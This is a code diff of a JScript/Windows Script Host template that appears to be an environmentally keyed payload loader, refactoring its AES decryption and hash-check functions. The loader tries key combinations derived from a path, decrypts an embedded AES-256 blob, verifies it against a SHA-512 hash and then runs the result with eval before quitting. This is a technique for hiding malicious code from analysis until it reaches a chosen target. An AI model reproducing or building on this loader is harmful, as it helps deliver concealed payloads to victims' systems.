@@ -1,12 +1,12 @@
 ~AUTOVERSION~
-function decryptAES(decryptMe, key) { 
+function decryptAES(decryptMe, key, iv) { 
     var aes = new ActiveXObject("System.Security.Cryptography.RijndaelManaged");
     var a = new ActiveXObject("System.Text.ASCIIEncoding");
     aes.Mode = 1; //CBC
     aes.Padding = 2; //PKCS7
     aes.BlockSize = 128;
     aes.KeySize = 256;
-    aes.IV = decodeBase64("~AESIVBASE64~");
+    aes.IV = decodeBase64(iv);
     aes.Key = a.GetBytes_4(key);
 
     var encBytes = decodeBase64(decryptMe);
@@ -37,10 +37,10 @@ function getSHA512(bytes) {
     var result = binToHex(sha512.ComputeHash_2((text.GetBytes_4(bytes))));
     return result
 }
-function compareHash(decrypted, hash) {
+function compareHash(decrypted, hash, minusBytes) {
     var sha512 = new ActiveXObject("System.Security.Cryptography.SHA512Managed");
     var text = new ActiveXObject("System.Text.ASCIIEncoding");
-    var newHash = getSHA512(decrypted.substring(0, (decrypted.length - ~MINUSBYTES~)));
+    var newHash = getSHA512(decrypted.substring(0, (decrypted.length - minusBytes)));
     if(newHash == hash) {
         return true;
     }
@@ -55,8 +55,8 @@ function tryKeyCombos(combos, path, encrypted, payloadHash) {
         key = getSHA512(key);
         key = key.substring(0,32);
         try {
-            var decrypted = decryptAES(encrypted, key)
-            if(compareHash(decrypted, payloadHash)) {
+            var decrypted = decryptAES(encrypted, key, "~AESIVBASE64~")
+            if(compareHash(decrypted, payloadHash, ~MINUSBYTES~)) {
                 eval(decrypted);
                 WScript.Quit(1);
             }
